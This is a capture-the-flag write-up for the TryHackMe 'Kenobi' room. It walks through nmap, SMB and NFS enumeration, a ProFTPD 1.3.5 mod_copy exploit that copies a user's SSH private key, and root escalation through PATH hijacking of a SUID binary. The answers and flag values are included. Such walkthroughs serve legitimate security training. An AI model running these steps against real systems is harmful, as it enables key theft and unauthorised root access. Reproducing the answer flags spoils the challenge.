![Kenobi Banner](https://i.imgur.com/zWNY3JF.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/kenobi/Kenobi_Cover.png" alt="Kenobi Logo">
</p>

# Kenobi

This guide contains the answer and steps necessary to get to them for the [Kenobi](https://tryhackme.com/room/kenobi) room.

## Table of contents

- [Deploy the vulnerable machine](#deploy-the-vulnerable-machine)
- [Enumerating Samba for shares](#enumerating-samba-for-shares)
- [Gain initial access with ProFtpd](#gain-initial-access-with-proftpd)
- [Privilege Escalation with Path Variable Manipulation](#privilege-escalation-with-path-variable-manipulation)

### Deploy the vulnerable machine

1. Make sure you're connected to our network and deploy the machine

2. Scan the machine with nmap, how many ports are open?

   Using nmap we can scan for open ports using:

   ```console
   sudo nmap -sS 10.10.208.77
   ```

   ![Deploy Nmap](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/kenobi/Kenobi_Deploy_Nmap.png)

   ><details><summary>Click for answer</summary>7</details>

### Enumerating Samba for shares

1. Using nmap we can enumerate a machine for SMB shares. Nmap has the ability to run to automate a wide variety of networking tasks. There is a script to enumerate shares! `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP` SMB has two ports, 445 and 139. Using the nmap command above, how many shares have been found?

   Using the following command we can find all available shares:

   ```console
   nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.208.77
   ```

   ![Enumerate Shares](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/kenobi/Kenobi_Enumerate_Shares.png)

   ><details><summary>Click for answer</summary>3</details>

2. On most distributions of Linux smbclient is already installed. Lets inspect one of the shares. `smbclient //MACHINE_IP/anonymous` Using your machine, connect to the machines network share. Once you're connected, list the files on the share. What is the file can you see?

   We can connect to the share using `smbclient //10.10.208.77/anonymous`.

   Then we list the files using `dir`.

   ![Enumerate Files](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/kenobi/Kenobi_Enumerate_Files.png)

   We can download this file using `smbget`.

   ```console
   smbget -R smb://10.10.208.77/anonymous
   ```

   ![Enumerate Smbget](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/kenobi/Kenobi_Enumerate_Smbget.png)

   ><details><summary>Click for answer</summary>log.txt</details>

3. You can recursively download the SMB share too. Submit the username and password as nothing. `smbget -R smb://MACHINE_IP/anonymous` Open the file on the share. There is a few interesting things found. Information generated for Kenobi when generating an SSH key for the user Information about the Pro FTPD server. What port is FTP running on?

   In our previous nmap scan we can find the port ftp is running on.

   ><details><summary>Click for answer</summary>21</details>

4. Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. In our case, port 111 is access to a network file system. Lets use nmap to enumerate this. `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount MACHINE_IP` What mount can we see?

   Using the following command and script we can find out which mount is accessible.

   ```console
   nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.208.77
   ```

   ![Enumerate Mount](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/kenobi/Kenobi_Enumerate_Mount.png)

   ><details><summary>Click for answer</summary>/var</details>

### Gain initial access with ProFtpd

1. Lets get the version of ProFtpd. Use netcat to connect to the machine on theFTPport. What is the version?

   We can either get the version by scanning with nmap (using -sV) or netcat.

   ```console
   nmap 10.10.208.77 -p21 -sV
   ```

   ```console
   nc 10.10.208.77 21
   ```

   ![Proftp Version](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/kenobi/Kenobi_Proftp_Version.png)

   ><details><summary>Click for answer</summary>1.3.5</details>

2. We can use searchsploit to find exploits for a particular software version. Searchsploit is basically just a command line search tool for exploit-db.com. How many exploits are there for the ProFTPd running?

   Using the following command we can find any exploits for this particular version.

   ```console
   searchsploit proftp 1.3.5
   ```

   ![Proftp Exploits](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/kenobi/Kenobi_Proftp_Exploits.png)

   ><details><summary>Click for answer</summary>4</details>

3. You should have found an exploit from ProFtpd'smod_copy module.The mod_copy module implementsSITE CPFRandSITE CPTOcommands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from anypart of the filesystem to a chosen destination.We know that theFTPservice is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user.

4. We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands. We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.

   Running `site help` when connected to the FTP server we can indeed see that the cpfr and cpto commands are available. We can use these to move the id_rsa ssh key to the /var folder.

   ```console
   site cpfr /home/kenobi/.ssh/id_rsa
   site cpto /var/tmp/id_rsa
   ```

   ![Proftp Transfer](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/kenobi/Kenobi_Proftp_Transfer.png)

5. Lets mount the /var/tmp directory to our machine `mkdir /mnt/kenobiNFS`. `mount MACHINE_IP:/var /mnt/kenobiNFS` `ls -la /mnt/kenobiNFS` We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account.What is Kenobi's user flag (/home/kenobi/user.txt)?

   After mounting the /var share using:

   ```console
   sudo mount 10.10.208.77:/var /mnt/KenobiNFS
   ```

   we now have access to it from our machine. And we can cleary see the moved ssh key inside.

   ![Proftp Mounted](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/kenobi/Kenobi_Proftp_Mounted.png)

   Now lets move the file to our main folder and change the permissions to strict (otherwise ssh won't allow us to use it).

   ```console
    cp /mnt/KenobiNFS/tmp/id_rsa .
    chmod 600 id_rsa
    ```

    ![Proftp Copy](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/kenobi/Kenobi_Proftp_Copy.png)

    Now we can use the key to ssh into the machine using:

    ```console
    ssh -i id_rsa kenobi@10.10.208.77
    ```

    ![Proftp Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/kenobi/Kenobi_Proftp_Flag.png)

   ><details><summary>Click for answer</summary>d0b0f3f53b6caa532a83915e19224899</details>

### Privilege Escalation with Path Variable Manipulation

1. SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.To search the a system for these type of files run the following: `find / -perm -u=s -type f 2>/dev/null`. What file looks particularly out of the ordinary?

   After running `find / -perm -u=s -type f 2>/dev/null` we can look through the returned files for any that may stand out.

   ![Escalation Suid](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/kenobi/Kenobi_Escalation_Suid.png)

   ><details><summary>Click for answer</summary>/usr/bin/menu</details>

2. Run the binary, how many options appear?

   Run the binary with `menu`.

   ![Escalation Menu](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/kenobi/Kenobi_Escalation_Menu.png)

   ><details><summary>Click for answer</summary>3</details>

3. Strings is a command onLinuxthat looks for human readable strings on a binary. This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname). As this file runs as the root users privileges, we can manipulate our path gain a root shell. We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!

4. What is the root flag (/root/root.txt)?

   First we must create a version of curl containing a shell and give it the right permissions.

   ```console
   echo /bin/sh > /tmp/curl

   chmod 777 /tmp/curl
   ```

   Next we must add the `/tmp` folder to the PATH variable and we can run the program.

   ```console
   export PATH=/tmp:$PATH
   
   /usr/bin/menu
   ```

   Select option 1 to get a shell. Now we can get our flag.

   ![Escalation Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/kenobi/Kenobi_Escalation_Shell.png)

   ><details><summary>Click for answer</summary>177b3cd8562289f37382721c28381f02</details>

